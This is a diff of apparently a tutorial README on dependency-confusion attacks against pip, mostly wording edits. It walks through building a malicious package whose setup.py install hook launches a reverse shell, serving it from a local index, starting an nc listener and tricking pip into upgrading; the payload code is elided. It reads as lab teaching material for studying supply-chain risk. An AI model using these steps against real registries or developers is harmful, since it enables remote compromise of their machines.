@@ -24,14 +24,15 @@ Proceed to install the test package:
      ...
      Successfully installed pip-install-test-0.5
 
-To perform our attack we must set a local pip repo. This is a very easy task: https://packaging.python.org/en/latest/guides/hosting-your-own-index
-Here I'm going just to create the required folder structure, then I will use Python built-in web server to host the malicious package. My root web folder structure is the following:
+To perform our attack we must set a local pip repo. This is a very easy task: https://packaging.python.org/en/latest/guides/hosting-your-own-index.
+Here I'm going just to create the required folder structure, then I will use Python built-in web server to host the malicious package. My root web folder structure will be the following:
 
     piprepo.local/
     └── pip-install-test
         └── pip-install-test-0.6.tar.gz
 
-You can download the package from this repo and serve it directly using your web server, but for the sake of learning we are going to recreate the package from scratch. Once you have decompressed the archive you will have the following directory structure:
+You can download the package from this repo and serve it directly using your web server, but for the sake of learning, we are going to recreate the package from scratch. 
+Once you have decompressed the archive, you will have the following directory structure:
 
         pip-install-test-0.6/
         ├── pip_install_test
@@ -47,7 +48,7 @@ You can download the package from this repo and serve it directly using your web
         ├── setup.cfg
         └── setup.py
 
-We can delete some stuff that actually we don't need to recreate the package:
+We can delete some stuff that actually we don't need, since they will be recreated:
 
         cd pip-install-test-0.6/
         rm -r setup.cfg pip_install_test.egg-info
@@ -61,7 +62,7 @@ Now our package source folder structure should be:
         ├── README.rst
         └── setup.py
 
-We are interested in abuse the set-up procedure, so our payload has to be inserted into setup.py:
+We are interested in abusing the set-up package procedure, so our payload has to be inserted into setup.py:
 
        ...
             
@@ -86,10 +87,10 @@ We are interested in abuse the set-up procedure, so our payload has to be insert
                     'install': PostInstallCmd
                 }
               )
-The interesting part is the cmdclass attribuite object, that will execute the actual apyload, that of course is a reverse shell to localhost, in this case.
+The interesting part is the cmdclass attribuite object, that will execute the actual payload, that of course is a reverse shell, to localhost in this case.
 
 ## Perform the attack
-First create the package (you know that to confuse pip we have to serve a more recent version, here I just incremented to 0.6). From inside the root package source directory execute:
+First create the package (you know that to confuse pip we have to serve a more recent version, here I just incremented it to 0.6). From inside the root package source directory execute:
 
     pip-install-test-0.6$ python3 setup.py sdist
     ...
@@ -119,12 +120,12 @@ From here we will execute our web server:
     ~/piprepo.local$ python3 -m http.server
     Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
-Now we have to trick pip to get our malicious package, we can just update pip-install-test, saying to pip to look in our local repo for the new version. Before that start a nc listener:
+Now we have to trick pip to get our malicious package, we can just update pip-install-test, saying to pip to look in our local repo for the new version. Before to proceed start a nc listener:
 
      nc -lvp 9001
     listening on [any] 9001 ...
 
-Then from the virtual enviroment proceed to update the package:
+Then from the virtual enviroment perform the package update:
 
     (dep-conf) user@xxxxx:~$  pip3 install pip-install-test --trusted-host <your_hostname> --index-url http://<your_hostname>:8000 -vv -U
     ...
